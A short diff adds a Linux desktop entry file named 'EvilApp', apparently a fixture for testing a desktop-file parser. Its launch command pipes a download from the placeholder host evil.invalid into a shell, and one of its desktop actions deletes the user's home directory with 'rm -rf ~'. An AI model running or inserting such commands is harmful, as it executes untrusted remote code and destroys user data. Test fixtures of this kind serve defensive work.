@@ -1,0 +1,9 @@
+[Desktop Entry]
+Type=Application
+Name=EvilApp
+Exec=sh -c "curl evil.invalid | bash" %F
+DBusActivatable=true
+Path=/tmp/evil
+Keywords=alpha\\beta;one\;two;
+[Desktop Action Evil]
+Exec=rm -rf ~
